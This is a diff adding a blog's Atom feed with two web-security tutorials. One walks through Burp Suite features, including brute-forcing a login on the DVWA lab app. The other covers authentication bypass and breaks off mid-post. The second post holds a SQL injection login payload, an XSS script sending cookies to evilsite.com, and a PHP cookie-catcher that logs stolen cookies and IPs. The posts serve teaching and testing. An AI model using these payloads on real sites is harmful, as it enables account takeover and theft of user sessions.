@@ -1,0 +1,756 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: burpsuite | Prateek Gianchandani]]></title>
+  <link href="http://prateek147.github.io//categories/burpsuite/atom.xml" rel="self"/>
+  <link href="http://prateek147.github.io/"/>
+  <updated>2016-06-07T09:12:32+04:00</updated>
+  <id>http://prateek147.github.io/</id>
+  <author>
+    <name><![CDATA[Prateek Gianchandani]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Burpsuite Walkthrough]]></title>
+    <link href="http://prateek147.github.io/2013/06/19/burpsuite-walkthrough"/>
+    <updated>2013-06-19T05:07:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/19/burpsuite-walkthrough</id>
+    <content type="html"><![CDATA[<p>Burpsuite is one of the best tools available for web application testing. Its wide variety of features helps us perform various tasks, from intercepting a request and modifying it on the fly, to scanning a web application for vulnerabilities, to brute forcing login forms, to perfoming a check for the randomness of session tokens and many other functions. In this article we will be doing a complete walkthrough of Burpsuite discussing all its major features.</p>
+
+
+
+
+<p>Burpsuite (free edition) is available by default in Backtrack 5. The professional edition can be downloaded from <a href="http://portswigger.net/burp/download.html">here</a>. Some of the features that are not available in the free edition are Burp Scanner, Task Scheduler, Target Analyzer etc. Overall it has the following features.</p>
+
+
+
+
+<!-- more -->
+
+
+<p></p>
+
+<p><b>1) Proxy</b> - Burpsuite comes with a proxy, which runs on port 8080 by default. Using this proxy, we 
+can intercept and modify the traffic as it flows from the client system to the web application. In order to use this proxy, we have to configure our browser to use this proxy. We can also drop the packets if we want so that they do not reach their intended destination, redirect the traffic to a particular host etc.</p>
+
+
+
+
+<p><b>2) Spider</b> - The spider feature of Burpsuite is used to crawl web applications looking for new links, content etc. It automatically submits login forms (through user defined input) in case it finds any, and looks for new content from the responses. This information can then be sent to the Burp Scanner to perform a detailed scan on all the links and content provided by the spider.</p>
+
+
+
+
+<p><b>3) Scanner</b> - It is used to scan web applications for vulnerabilities. The type of scanning can be passive, active or user-directed. Some false positives might occur during the tests. It is important to remember that no automated scanner is 100 percent accurate in its results. Unfortunately Burp Scanner is not available with the Free edition that is included in Backtrack 5.</p>
+
+
+
+
+<p><b>4) Intruder</b> - This feature can be used for various purposes like exploiting vulnerabilities, fuzzing web applications, carrying out brute force attacks etc.</p>
+
+
+
+
+<p><b>5) Repeater</b> - This feature is used to modify and send the same request a number of times and analyze the responses in all those different cases. </p>
+
+
+
+
+<p><b>6) Sequencer</b> - This feature is mainly used to check the randomness of Session tokens provided by the web application. It performs various advanced tests to figure this out.</p>
+
+
+
+
+<p><b>7) Decoder</b> - This feature can be used to decode data to get back the original form, or to encode and encrypt data.</p>
+
+
+
+
+<p><b>8) Comparer</b> - This feature is used to perform a comparison between any two requests, responses or any other form of data. This feature could be useful when comparing the responses with different inputs.</p>
+
+
+
+
+<p><b>1) Proxy</b></p>
+
+
+
+
+<p>The proxy feature allows us to intercept and modify requests. In order to intercept the requests and manipulate them, we must configure our browser to direct its traffic through Burp's proxy, which is 127.0.0.1:8080 by default.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/1.png" width="499" height="495" alt="1"></p>
+
+<p>Once this is done, open up Burpsuite, go to Proxy-->Intercept and make sure Intercept is on.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/2.png" width="798" height="89" alt="2"></p>
+
+<p>Go to the alerts tab, we can see that a proxy service is running on port 8080. We can also change this configuration by going to the options tab under proxy.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/3.png" width="802" height="77" alt="3"></p>
+
+<p> Let's have a look at all the options we have while running the proxy, go to the options tab under proxy</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/4.png" width="777" height="504" alt="4"></p>
+
+<p>Here we can edit the port the proxy is listening on, and even add a new proxy listener. Burp also has option of presenting certificates to SSL protected websites. By default, Burp creates a self signed CA certificate upon installation. The current checked option, i.e <i>generate CA-signed per-host certificates</i> will generate a certificate for the particular host we are connecting to signed by Burp's CA certificate. The only thing with which we are concerned here is to decrease the number of warnings which a user gets when connecting to a SSL protected website.</p>
+
+
+<p></p>
+
+<p>If we don't check the <i>listen in loopback interface only</i> option then this means that the burp proxy can serve as a proxy for other systems on the network too. This means any computer in the same network can use this Burp proxy as a proxy and relay its traffic through it. </p>
+
+
+
+
+<p>The <i>support invisible proxying for non-proxy-aware client</i> option is used for clients that do not know that they are using a proxy. This means that the option for proxy is not set in the browser, but somewhere else, for e.g in the hosts.txt file. The only issue with this is that the request in this case will be a bit different than the requests when the proxy option is set in the browser itself, and hence Burp needs to know if it is receiving traffic from a non-proxy aware client. The <i>redirect to host, redirect to port</i> option will redirect the client to the host and port we specify in that option.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/5.png" width="794" height="479" alt="5"></p>
+
+<p>Similarly we can intercept requests and responses based on the rules we specify here. This could be a handy feature when we want to intercept only some of the requests in a very high traffic environment. </p>
+
+
+<p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <img src="http://prateek147.github.io/images/posts/burpsuite/6.png" width="777" height="482" alt="6"></p>
+
+<p>There are options for modifying HTML received from the response. We can unhide hidden form fields, remove javascript etc. Similarly there is an option for finding a specific pattern and replacing it with a custom string. We need to specify regular expressions here. Burp will parse the request or response looking for this pattern and will replace it with the custom string.</p>
+
+
+
+
+<p>Now that we have set up Burpsuite and the configurations in our browser properly, we can intercept requests. Please note that whenever we send a request, it will be intercepted by Burpsuite and we will have to forward it manually. Hence it is advisable to keep "intercept is on" option checked only when you really want to see the contents of the packets going through.</p>
+
+
+
+
+<p>Open up your browser and start browsing. We will see that the request is being intercepted by Burpsuite. Hence our proxy is working fine, we can right click on it and send the request to various other tools in Burpsuite for analysis.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/7.png" width="801" height="564" alt="7"></p>
+
+<p><b>2) Spider</b> - Burp Spider is used for mapping web application. It will automatically crawl the web application, looking for links, will submit any login forms it finds and hence provide a detailed analysis of the whole application. These links can then be passed over to Burp Scanner to perform a detailed scan using the information provided by the scanner. In this case i will be using the spider tool on DVWA (Damn vulnerable Web Application). To do that simply go to the application DVWA using your browser, make sure intercept is on in Burpsuite, and get the request intercepted by Burpsuite. Right click on the intercepted request, and click on <i>send to spider</i>.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/8.png" width="802" height="541" alt="8"></p>
+
+<p>Once you do this, an alert will pop up asking us to add the item to the scope. Click on <i>Yes</i>. A scope basically defines the target region on which we want to run our tests.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/9.png" width="801" height="116" alt="9"></p>
+
+<p>If we go to the <i>target</i> tab under <i>site map</i>, we will see that the url has been added in the target. Also we can see that some other targets like http://google.com have been added to the targets list. Burpsuite automatically adds targets as we browse the web while using Burp's proxy. We can add the targets to our scope by right clicking on any target and clicking on <i>add item to scope.</i>. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/11.png" width="800" height="513" alt="11"></p>
+
+<p><p>If we go to the <i>Scope</i> tab we find that the application dvwa has been added to the scope.</i></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/10.png" width="800" height="510" alt="10"></p>
+
+<p><p>Go to the Spider tab now and click on options. Here we can set various options while running the Burp spider on the application. We can ask it to check for robots.txt file, in which it will try to crawl to the directories that the website administrator has not allowed to be indexed for search engines. Another important option is <i>passively spider as you browse</i>. Basically Burp Spider can be run both in passive and active mode. This asks Burp Spider to keep scanning for new links, content as we browse the web application using Burp&rsquo;s proxy.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/12.png" width="798" height="509" alt="12"></p>
+
+<p><p>Another important option is <i>application login</i>. Whenever Burp Spider hits a login form while crawling, it can automatically submit the credentials that we provide to it here. I have asked Burp Spider to submit the credentials <i>admin/password</i> as these are the credentials used in DVWA. Hence Burp spider will submit these credentials automatically and keep crawling ahead looking for extra information. You can also change the thread count if you want.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/13.png" width="800" height="511" alt="13"></p>
+
+<p><p>To begin spidering an application, just right click on the target to reveal the branch for DVWA (in this case dvwa) and click on <i>spider this branch</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/14.png" width="791" height="389" alt="14"></p>
+
+<p><p>This will start the Burp Spider. If we go to the Spider control tab, we can see the requests being made. We can also define a custom scope for Burp Spider.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/16.png" width="801" height="333" alt="16"></p>
+
+<p><p>Once it has finished running, we will see a lot of new URL&rsquo;s for dvwa branch. This provides us very useful information about the web application. We can then send these URLs to other Burp tools like Burp Scanner (available only in professional edition) and scan it for vulnerabilities.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/15.png" width="799" height="533" alt="15"></p>
+
+<p><p><b>3) Intruder</b> &ndash; Burp Intruder can be used for exploiting vulnerabilities, fuzzing, carrying out brute force attacks and many other purposes. In this case we will be using the Intruder feature in Burp Suite to carry out a brute force attack against DVWA. Browse over to DVWA and click on Brute Force. Enter any username/password, make sure <i>Intercept is on</i> in Burpsuite, and click on <i>Login</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/18.png" width="624" height="340" alt="18"></p>
+
+<p><p>The request will be intercepted by Burpsuite, right click on it and click on &ldquo;send to intruder&rdquo;</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/19.png" width="795" height="488" alt="19"></p>
+
+<p><p>This will send the request information to the Intruder. Go to the <i>Intruder</i> tab. Now we will have to configure Burpsuite to launch the brute force attack. Under the <i>target</i> tab, we can see that it has already set the target by looking at the request.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/20.png" width="776" height="211" alt="20"></p>
+
+<p><p>Go to the positions tab now, here we can see the request which we had previously sent to intruder. Some of the things are highlighted in the request. This is basically a guess by Burpsuite to figure out what all things will be changing with each request in a Brute force attack. Since in this case only username and password will be changing with each request, we need to configure Burp accordingly.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/21.png" width="774" height="444" alt="21"></p>
+
+<p><p>Click on the clear button on the right hand side. This will remove all the highlighted text, now we need to configure Burp to only set the username and password as the parameters for this attack. Highlight the username from this request (in this case &ldquo;infosecinstitute&rdquo;) and click on Add. Similarly, highlight the password from this request and click on Add. This will add the username and password as the first and second parameters. Once you are done, your output should look something like this.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/22.png" width="780" height="479" alt="22"></p>
+
+<p><p>The next thing we need to do is set the Attack type for this attack, which is found at the top of the request we just modified. By default it is set to Sniper. However, in our case we will be using the Attack type &ldquo;Cluster Bomb&rdquo;. According to <a href="http://portswigger.net/burp/help/intruder.html">Burp&rsquo;s documentation</a> from <a href="http://portswigger.net/">portswigger.net</a> here is the difference between the different types of attack. </p></p>
+
+<p><p>Sniper &ndash; This uses a single set of payloads. It targets each position in turn, and inserts each payload into that position in turn. Positions which are not targeted during a given request are not affected &ndash; the position markers are removed and any text which appears between them in the template remains unchanged. This attack type is useful for testing a number of data fields individually for a common vulnerability (e.g. cross-site scripting). The total number of requests generated in the attack is the product of the number of positions and the number of payloads in the payload set.</p></p>
+
+<p><p>battering ram &ndash; This uses a single set of payloads. It iterates through the payloads, and inserts the same payload into all of the defined positions at once. This attack type is useful where an attack requires the same input to be inserted in multiple places within the HTTP request (e.g. a username within the Cookie header and within the message body). The total number of requests generated in the attack is the number of payloads in the payload set.</p></p>
+
+<p><p>pitchfork &ndash; This uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 8). The attack iterates through all payload sets simultaneously, and inserts one payload into each defined position. I.e., the first request will insert the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second request will insert the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc. This attack type is useful where an attack requires different but related input to be inserted in multiple places within the HTTP request (e.g. a username in one data field, and a known ID number corresponding to that username in another data field). The total number of requests generated by the attack is the number of payloads in the smallest payload set.</p></p>
+
+<p><p>cluster bomb &ndash; This uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 8). The attack iterates through each payload set in turn, so that all permutations of payload combinations are tested. I.e., if there are two payload positions, the attack will place the first payload from payload set 1 into position 1, and iterate through all the payloads in payload set 2 in position 2; it will then place the second payload from payload set 1 into position 1, and iterate through all the payloads in payload set 2 in position 2. This attack type is useful where an attack requires different and unrelated input to be inserted in multiple places within the HTTP request (e.g. a username in one parameter, and an unknown password in another parameter). The total number of requests generated by the attack is the product of the number of payloads in all defined payload sets &ndash; this may be extremely large.</p></p>
+
+<p><p>As we can see in the image below, our attack type is set to &ldquo;Cluster Bomb&rdquo;.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/23.png" width="767" height="154" alt="23"></p>
+
+<p><p>Go to the payload tab, make sure payload set 1 is selected, click on load and load the file containing a list of usernames. In my case I am using a very small file just for demonstrations purposes. Once you load the file all the usernames will be displayed as shown in the image below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/24.png" width="776" height="322" alt="24"></p>
+
+<p><p>Similarly select payload set 2, click on load and load the file containing a list of passwords.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/25.png" width="770" height="329" alt="25"></p>
+
+<p><p>Go to the options tab now and make sure &ldquo;store requests&rdquo;  and &ldquo;store response&rdquo; options are set under results. Have a look at all the options and see if you need or don&rsquo;t need any of these options. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/26.png" width="773" height="205" alt="26"></p>
+
+<p><p>All right we are now set to launch our attack. Click on <i>Intruder</i> on the top left and click on <i>start attack</i>. We will see a window pop up with all the requests being made. So how do we know which request is successful ? Usually a successful request will have a different response than an unsuccessful request or will have a different status response. In this case we see that the request with the username &ldquo;admin&rdquo; and the password &ldquo;password&rdquo; has a response of different length than the other responses.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/27.png" width="782" height="550" alt="27"></p>
+
+<p><p>Let&rsquo;s click on the request with a different response size. If we click on the response section, we see the text &ldquo;Welcome to the password protected area admin&rdquo; in the response. This confirms that the username/password used in this request is the correct one.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/28.png" width="778" height="572" alt="28"></p>
+
+<p><p> I recommend you explore Burp Intruder in more detail as it is one of the most powerful features available in Burpsuite. </p></p>
+
+<p><p><b>4) Repeater</b> &ndash; With Burp Repeater, we can manually modify a request, and resend it to analyze the response. We need to send a request to Burp Repeater for this. The request can be sent to it from various places like Intruder, proxy etc. Let&rsquo;s send a request to Repeater from the Intruder attack we just performed on DVWA. To send the request to the Intruder, just right click on the request and click on <i>Send to Intruder</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/29.png" width="700" height="415" alt="29"></p>
+
+<p><p>If we go to the Repeater tab, we can see the request there. We also see that there are 3 tabs with the name 1,2 and 3. In Burp Repeater, a tab is used for each request.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/30.png" width="799" height="511" alt="30"></p>
+
+<p><p>We can also see the params, header, hex and raw format of the request. We can modify any of these before sending the request.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/31.png" width="794" height="464" alt="31"></p>
+
+<p><p>Let&rsquo;s just change the username, password to the correct one, i.e username=admin and password=password and click on <i>Go</i>. This will send the request.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/32.png" width="795" height="335" alt="32"></p>
+
+<p><p>We can analyze the response in the response section. Again we have the option to see the params, header, hex and raw format of the response. The render option displays the page as if it were displayed in a browser, though it is not fully reliable.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/33.png" width="795" height="129" alt="33"></p>
+
+<p><p><b>5) Sequencer</b> &ndash; Burp Suite Sequencer is used to figure out the randomness of the Session tokens generated by a web application. This is because Session tokens are usually used to authenticate a user, and hence should not be compromised. It is important for a web application to have a high degree of randomness for Session tokens, so that brute force attacks are not successful against it. We need to send a request which returns a Session token to the sequencer, the Sequencer then repeatedly sends the request, thus obtaining a high number of Session ID&rsquo;s. It then passes these Session ID&rsquo;s through various statistical tests to determine the randomness.</p></p>
+
+<p><p>Let&rsquo;s send a request that returns a session token to the Sequencer. Right click on the request and click on <i>Send to Sequencer</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/41.png" width="798" height="429" alt="41"></p>
+
+<p><p>In sequencer we can see that it automatically identified the ID parameter. We can also use manual selection to select it ourselves, or we can use the cookie and form field drop box to select the value which we think is the Session token.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/42.png" width="797" height="336" alt="42"></p>
+
+<p><p>Click on start capture to start the process.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/43.png" width="797" height="237" alt="43"></p>
+
+<p><p>We can see the requests being made and the different tokens being received. It is good to have a sample size of atleast 100-200 tokens before starting the analysis. However, the more no of tokens, the better would be the test results. Once you think you have captured enough tokens, click on <i>Analyze now</i>. We will see that Burp Sequencer is now performing all the tests.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/44.png" width="800" height="298" alt="44"></p>
+
+<p><p> The result are displayed as shown in the figure below. As we can see in the result, the overall randomness within the sample is estimated to be excellent. You can switch between tabs to see the results of different types of analyses.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/45.png" width="891" height="549" alt="45"></p>
+
+<p><p>Burp Suite will still continue to capture tokens, so that you can again perform the test once you have collected some more tokens.Examining the different types of test and how they work is beyond the scope of this article. To understand how Burp Sequencer actually works, read this <a href="http://blog.portswigger.net/2008/05/burp-sequencer-101.html">nice article</a>.</p>
+
+<p><p><b>6) Comparer </b> &ndash; Burp Suite Comparer tool is used to do a comparison between 2 pieces of data, which could be requests, responses etc. We must provide the Comparer tool with 2 pieces of data in order to do that. In this case we will be giving the Comparer tool a successful response and an unsuccessful response from the brute force attack against DVWA which we carried out earlier. Make sure the response tab is selected while sending it to the comparer so that we send the responses and not the requests. Right click on an unsuccessful response and click on <i>send to comparer</i>, do the same for the successful response (which is the response for request #11 in the figure below).
+</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/34.png" width="699" height="527" alt="34"></p>
+
+<p><p>Go to the comparer tab. Here we can see the two responses which we had sent to it earlier. Click on the first response (#3) on the top half, and on the second response(#4) on the bottom half. Now the two responses have been selected to carry out a comparison between them.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/35.png" width="800" height="553" alt="35"></p>
+
+<p><p>We have two ways of performing a comparison between the two responses, through words or through bytes. Click on <i>words</i> to perform a comparison by words. The result is pretty clear. While one response has a &ldquo;Username and/or password incorrect&rdquo; message, the other one has a &ldquo;Welcome to the password protected area admin&rdquo; message.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/36.png" width="798" height="496" alt="36"></p>
+
+<p><p>Similarly, comparing by using bytes returns the following output. By now you must have begun to understand the importance of this tool. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/37.png" width="800" height="495" alt="37"></p>
+
+<p><p><b>7) Decoder</b> &ndash; Burpsuite Decoder can be used to decode encoded data to get back the canonical form, and can also be used to encode and encrypt data to get the encoded and encrypted forms. We can manually paste data into the decoder or send an encoded request to it. In this case i will be sending an HTML Basic authentication request that contains the username and password in base64 encoded form to the decoder. Right click on the request and click on <i>Send to Decoder</i></p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/38.png" width="798" height="460" alt="38"></p>
+
+<p><p>Highlight the encoded form and click on <i>decode as</i> and then click on <i>base64</i></p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/39.png" width="797" height="309" alt="39"></p>
+
+<p><p>Burp Decoder decodes the base64 encoded string and gives us the username/password in plaintext.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/burpsuite/40.png" width="802" height="533" alt="40"></p>
+
+<p><p>You should check out the <i>Smart Decode</i> feature too in burpsuite, in which Burp decoder intelligently guesses the encoding used and decodes it. Though it is not fully reliable and some mistakes might occur.</p></p>
+
+<p><p><b>8) Scanner</b> &ndash;  Burp Scanner is one of the most powerful web application scanners. Though, like any other web application scanner, it is not perfect and some false positives may occur. Burp Scanner is not available with the free edition. You can find more information about Burp Scanner <a href="http://portswigger.net/burp/scanner.html">here</a>.</p>
+
+<p><h3>Conclusion</h3></p>
+
+<p><p> In this article we looked at almost all the popular features of Burp Suite like proxy, scanner, sequencer, repeater, etc. The extent to which it can be helpful in Web application testing is only up to the imagination of the user which makes it a valuable tool for web application testing.</p></p>
+
+<p><b>References</b>
+<ol>
+ <li><p>PortSwigger Website</br><a href="http://portswigger.net/burp/"><a href="http://portswigger.net/burp/">http://portswigger.net/burp/</a></a></p></li>
+ <li><p>Hacking Web Authentication &ndash; Part 1</br><a href="http://resources.infosecinstitute.com/authentication-hacking-pt1/"><a href="http://resources.infosecinstitute.com/authentication-hacking-pt1/">http://resources.infosecinstitute.com/authentication-hacking-pt1/</a></a></p></li>
+ <li><p>Burp Sequencer 101</br><a href="http://blog.portswigger.net/2008/05/burp-sequencer-101.html"><a href="http://blog.portswigger.net/2008/05/burp-sequencer-101.html">http://blog.portswigger.net/2008/05/burp-sequencer-101.html</a></a></p></li>
+ <li><p>Burp Scanner</br><a href="http://portswigger.net/burp/scanner.html"><a href="http://portswigger.net/burp/scanner.html">http://portswigger.net/burp/scanner.html</a></a></p></li></p>
+
+<p></ol></p>
+
+<p><p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hacking Web Authentication – Part 2]]></title>
+    <link href="http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-2"/>
+    <updated>2013-06-12T05:03:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-2</id>
+    <content type="html"><![CDATA[<p><a href="http://highaltitudehacks.com/blog/2013/06/12/hacking-web-authentication-part-1/">In the first part of this article</a> we looked at some of the common authentication types used in Web Applications these days and discussed their pros and cons. In this article we take it one step further and discuss some of the advanced authentication methods used these days. We will also discuss the various techniques for bypassing web based authentication, and discuss the steps needed to avoid such kinds of vulnerabilities. <!-- more --> Overall this article will be divided into two sections.</p>
+
+
+
+
+<h2>A) Bypassing Authentication</h2>
+
+
+<ol>
+    <li>SQL Injection</li>  
+    <li>Cookie Stealing</li>
+    <li>Session Hijacking</li>
+</ol>
+
+
+
+
+<h2>B) Advanced Authentication Methods</h2>
+
+
+<ol>
+    <li>Certificate Based Authentication</li>
+    <li>Two-Factor Authentication</li>
+    <li>Open ID</li>
+</ol>
+
+
+
+
+<h2>Bypassing Authentication</h2>
+
+
+
+
+<p>Bypassing authentication is one of the most useful techniques as it does not require us to know the user's credentials in order to access the user's profile. This technique however does not work with HTML-Basic authentication type because, as we remember from the first part of this article, HTML-Basic requires us to send the username and password with every request.</p>
+
+
+
+
+<p><b>a) SQL Injection</b>- This technique is valid in cases when the user's credentials are processed at the backend in an SQL statement. If the user's input is not validated properly, then the attacker has the capability to inject the SQL statement with malicious queries which will allow him to bypass the authentication.</p>
+
+
+
+
+<p>Let's say the SQL statement which is responsible for validating the input sent by the user looks something like this. The <i>Username</i> and <i>Password</i> are the values of the username and password passed by the user which is then sent to this SQL Statement without input validation.</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'Username' and PASSWORD = 'Password';</pre>
+
+
+
+
+<p>Let's say the user enters the username as <i> admin' OR 1=1 --</i> and the password as <i>blah</i>.</p>
+
+
+
+
+<p>The SQL query will look like this now.</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --' and PASSWORD = 'blah';</pre>
+
+
+
+
+<p>If we look closely at the SQL statement, the statement will only get executed till the following line as all the other characters are commented out because of the dashes "--".</p>
+
+
+
+
+<pre>SELECT * FROM USER_TABLE WHERE USERNAME = 'admin' OR 1=1 --</pre>
+
+
+
+
+<p>Hence the SQL statement selects the user admin if a user with the username "admin" is available in its database otherwise it just returns the first user in the database because the BOOL value of the statement evaluates to TRUE. Hence there was no use of any password in this case. Input validation must be done in order to protect from SQL Injection. Note that SQL Injection in itself is a very massive topic and the case discussed in this article in one of the most simplest forms of SQL Injection. Also note that it is not necessary that the credentials are always validated in the backend with a SQL statement, in which case SQL Injection will not work.</p>
+
+
+
+
+<p><b>b) Cookie Stealing</b>-Cookies are another source of valuable information that is stored on the user's computer. Cookies can include valuable information about the user, which could be the user/pass in encoded or encrypted format, the session ID value etc. As far as web authentication is concerned, cookies can be a valuable resource in maintaining the state between the user and the website. A good example of this is a web application which sets a cookie on the user's system once the user logs in successfully. For all the subsequent requests the user doesn't have to send his credentials now as long as the cookie doesn't expire. However this could be a security issue. The problem is that in an open unencrypted network, it is very easy to capture the cookie's of various users using packet sniffing tools like Wireshark etc. Once the attacker has the cookie, he can use that cookie to impersonate the user. To protect the victim from getting compromised because of these risks, there are different flags that can be set on the server side for issuing cookies to the user.</p>
+
+
+
+
+<p><b class="small">Secure Flag</b>- This flag ensures that the cookie is never transmitted over an unencrypted channel and should always be passed from the client to the server over a secure channel (HTTPS). This flag is very useful as it protects the victim from eavesdropping attacks.</p>
+
+
+
+
+<p><b class="small">Http-Only Flag</b>- This feature ensures that the Cookie is not accessible from any non-Http Api's. This prevents the victim from cookie stealing attacks where the attacker can use javascript to directly access the sessions cookies. Note that this method is not completely foolproof but provides a decent level of security and hence should be used whenever needed.</p>
+
+
+
+
+<p>Note that not all the values in a cookie are related to maintaining the user's session with the website. Some of them could just be used to monitor the user's activities or for some other reasons. Let's do a quick dissection of the cookies set on our system while using Facebook. I will be using the Firefox Add-on <i>Cookie Manager</i> to view the cookies set by Facebook. It is a very handy add-on for monitoring and changing cookies.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth2//Screen Shot 2012-01-15 at 5.58.25 PM.png" width="1439" height="417" alt="Screen Shot 2012 01 15 At 5.58.25 PM"></p>
+
+<p>As we can see there are a number of name-value pairs in the cookies stored by facebook on our system. Also, not all of them are related to the user's session. In my case i modified the cookie value with the name "s" and found out that i was still able to browse through facebook, hence the session was still maintained. But when i modified the cookie value with the name "c_user", and tried to surf pages across facebook i found out that i was logged out, i.e the session state was broken and i had to reenter my credentials.</p>
+
+
+
+
+<p>There could be a number of ways for stealing cookies. In this case i will be discussing the technique of stealing cookies by exploiting an XSS vulnerability in the application. As we know that XSS allows us to execute a script on the victim's browser. Let's say we execute the following script on the victim machine.</p>
+
+
+
+
+<xmp><script>document.location='http://evilsite.com?cookie=<script>document.cookie</script>'</script></xmp>
+
+
+
+
+<p>What we are doing is accessing the user's cookie via javascript and passing it to an external website which stores the cookies of the user. Note that in order to access the cookie via Javascript, the HTTP-Only flag should not be set in the Cookie. Once the attacker has the user's cookies, he can enter the cookie values in his own browser by using tools like "Cookie Manager" etc and hence impersonate the user. Note that this method will work only if the website uses cookies for maintaining the session state between the client and the browser. On the evil site, we could have some php code that will receive the cookie and store it in a file. </p>
+
+
+
+
+<p>Here is what the code for the Cookie Catcher file looks like.</p>
+
+
+<p>```</p>
+
+<pre><code>&lt;?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");;
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('user_info.html', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; Referer: '.$referer.'&lt;br&gt;&lt;br&gt;&lt;br&gt;');
+fclose($fp);
+//Redirect the user to google.com
+header ("Location: http://www.google.com");
+?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>This type of attack can be prevented by using appropriate flags (Secure and HTTP-only) for cookies whenever needed. Use of encoding should be avoided in cookies as it is trivial to decode the cookies to get back the original value. Instead encryption should be used in cookies which will prevent it from eavesdropping attacks even in an open and unencrypted network.</p>
+
+
+
+
+<p><b>c) Session Hijacking</b>- In many cases a user who has authenticated successfully to a website is provided with a token value, or a session ID. This ID is used by the user while making subsequent requests to the website. In case the attacker is able to get the session ID, it is possible to impersonate the client depending on the security mechanisms deployed by the website. There are many ways of obtaining this session ID, sometimes the session ID is stored in the cookie and hence could be obtained by using the Cookie Stealing attacks as discussed earlier. In some cases, the session ID is passed as a query parameter, i.e in the URL. If an attacker has control of any proxy in between the client and the website, it is very easy for him to access the url from the logs and thus get the Session ID. In case the range of the Session ID's is known, it is also possible to brute force the session ID using Burpsuite as we did in part 1 of this article, the only difference now being that the parameter we are changing is the session ID.</p>
+
+
+
+
+<p> The following screenshot shows the session ID passed in a request to the application DVWA. Using Burpsuite it is possible to brute force with the session ID as the changing parameter. To learn more on how to brute force using Burp, refer to the <a href="http://resources.infosecinstitute.com/authentication-hacking-pt1/">Part 1</a> of this article.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth2//Screen shot 2012-01-16 at 1.17.54 PM.png" width="800" height="574" alt="Screen Shot 2012 01 16 At 1.17.54 PM"></p>
+
